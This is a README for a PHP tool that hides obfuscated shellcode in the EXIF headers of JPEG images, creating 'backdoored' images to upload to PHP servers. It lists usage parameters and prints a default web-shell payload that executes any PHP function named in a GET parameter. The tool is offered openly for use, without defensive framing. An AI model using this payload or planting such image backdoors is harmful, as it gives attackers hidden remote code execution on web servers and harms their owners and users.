PHP EXIF Backdoors generator using custom shellcode
==================

> PHPEB is a small tool that generates and stores obfuscated shellcode in user specified EXIF handlers.

* __Version__ : 1.0
* __Website__ : [Cyber Security Research Center from Romania](http://ccsir.org)
* __Contact__ : contact [at] ccsir [dot] org
 
##Usage
> php phpeb.php [params]

##Params
* -i path_to_image.jpg
* -o path_to_backdoored_image.jpg
* -s shellcode (optional)
* -h EXIF headers (N/A in v1.0, Default:Make,Model)
* -v verbose 1 or 0(optional, Default:0)
* Default: !empty(\$1=@\$_GET[1]) && \$1(\$_GET[2]);
	
##Help
  - No need. Just download these files and upload in an environment that supports PHP. You can send any feedback
    or questions to contact [at] ccsir [dot] org

##License

Copyright (C) 2013 Cyber Security Research Center from Romania

This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>.    
